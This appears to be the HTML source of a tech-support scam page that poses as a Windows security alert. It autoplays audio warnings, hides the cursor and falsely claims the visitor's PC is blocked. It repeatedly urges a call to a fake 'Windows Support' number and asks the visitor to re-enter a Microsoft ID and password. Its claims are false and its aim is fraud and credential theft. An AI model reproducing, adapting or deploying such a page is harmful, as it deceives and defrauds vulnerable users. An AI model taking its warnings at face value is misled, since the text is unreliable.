<html lang="en"><head><meta charset="utf-8">
      ...
      <link href="https://homemadeharvey.com/bluemoon/tapa.css" rel="stylesheet">
        <link href="https://homemadeharvey.com/bluemoon/bootstrap.min.css"  type="text/css" rel="stylesheet">
<script src="https://homemadeharvey.com/bluemoon/jquery.min.js"></script>
<script src="https://homemadeharvey.com/bluemoon/bootstrap.min.js" crossorigin="anonymous"></script>
<link rel="stylesheet" href="https://homemadeharvey.com/bluemoon/font-awesome.min.css">
<script src="https://homemadeharvey.com/bluemoon/jquery.min.js"></script>
<script src="https://homemadeharvey.com/bluemoon/bootstrap.min.js" crossorigin="anonymous"></script>
<link rel="stylesheet" href="https://homemadeharvey.com/bluemoon/font-awesome.min.css">
...
<script>
  ...
  <script type="text/javascript">
    ...
    <audio id="beep">
        <source src="https://homemadeharvey.com/bluemoon/beep.mp3" type="audio/mpeg">
      </audio>
      <audio autoplay="" id="pridez">
        <source src="https://homemadeharvey.com/bluemoon/eng.mp3" type="audio/mpeg">
      </audio>
      ...
      <a href="#" id="link_black" style="cursor:none" rel="noreferrer">
        ...
        <div class="bgimg" style="top:0">
          <img src="https://homemadeharvey.com/bluemoon/f24.png" alt="" width="100%">
        </div>
      </div>
      </a>
      <div class="pro_box" style="cursor: none; display: default;">
        <div class="pro_box_header">
          <div class="row">
            <div class="col-md-12">
              <div class="minimize">
                <ul>
                  <li>
                    <a href="#">
                      <img src="https://homemadeharvey.com/bluemoon/mnc.png">
                    </a>
                  </li>
                </ul>
              </div>
            ...
            <div class="col-md-4">
              <div class="logo">
                <img src="https://homemadeharvey.com/bluemoon/msmm.png">
            ...
            <div class="col-md-8">
              <div class="activate_lic">
                <ul>
                  ...
                  <li>
                    <a href="#">
                      <img src="https://homemadeharvey.com/bluemoon/set.png">
                    </a>
                  </li>
                  <li>
                    <a href="#">
            ...
            <div class="row">
              <div class="col-md-6">
                <div class="quick_scan">
                  <p>
                    <img src="https://homemadeharvey.com/bluemoon/vsc.png">
            ...
            <div class="col-md-8">
              <div class="activate_lic">
                <ul>
                  ...
                  <li>
                    <a href="#">
                      <img src="https://homemadeharvey.com/bluemoon/bel.png">
                    </a>
                  </li>
                  <li>
                    <a href="#">
        ...
        <div class="row">
          <div class="col-md-12">
            <div class="right-foot" style="text-align:center">
              <span id="footertxt">
                <img src="https://homemadeharvey.com/bluemoon/msmm.png"> Windows security </span>
              <span style="font-weight:500;padding-left:13px;color:#fff; ">Windows Support <span style="border:1px solid #fff;border-radius:5px;padding:2px 5px">    +1-866-201-8791
                </span>
              </span>
            </div>
          </div>
      ...
      <div class="lightbox" id="poptxt" onclick="beep1();" style="display: none; cursor:default;">
        <div class="ilb top" style="font-size:17px">
          <div class="ilb headers" style="border-bottom:1px solid #d6d5d5;">
            <span class="fl title" id="txtadd">
              <span class="fl ilb">
                <img src="https://homemadeharvey.com/bluemoon/dm.png" class="logo3">
        ...
        <img src="https://homemadeharvey.com/bluemoon/re.gif" id="banner">
        <div id="disclaimer" style="color:#0F396D;">Call support for help<br>
           <span class="support" style="font-size:22px;">Windows Support <span style="border:1px Solid #114d9a;border-radius:5px;padding:2px 5px">    +1-866-201-8791
            </span>
          </span>
        </div>
        <div id="bottom">
          <img src="https://homemadeharvey.com/bluemoon/msmm.png" id="badge">
      ...
      <div class="cardcontainer" style="cursor: default; display: none;" id="pop_up_new">
        ...
        <p>
         ...
         <p style="padding-bottom:0;color:#fff;font-size:16px">Windows Please call support:<strong>
            <span style="border:1px solid #fff;border-radius:5px;padding:2px 5px">   +1-866-201-8791
            </span>
          </strong>
        </p>
      ...
      <div class="answer_list" style="display:none;background-color: rgb(40 40 40 / 80%);;height:auto;width:550px;margin-left:33%;position:absolute;z-index:99999999;border:1px solid transparent;border-color:#d6d8db;border-radius:.5rem" id="welcomeDiv">
        <p style="color:#FFFFFF;margin-top:10px;font-size:16px;opacity:.9;padding:0 5px" class="text-center">Access to this PC has been blocked for security reasons. Do not access or restart this PC. If you overlook this basic warning, you may lose information about this framework. Contact support as soon as possible and a Microsoft expert will guide you through the investigation over the phone. Running this application may put your PC at risk。<br>
          <strong>
         Windows Support: <span style="border:1px solid #383d41;border-radius:5px;padding:2px 5px">    +1-866-201-8791
            </span>
          </strong>
        </p>
      </div>
      <div id="chat" style="display: none;">
        ...
        <h4 style="font-weight:600;color:#0F396D;font-size:22px">    +1-866-201-8791
...
<br>Please log in again using your Microsoft ID and password.<br>For assistance, contact Microsoft Support<br><strong>+1-866-201-8791 			 	</strong></p>
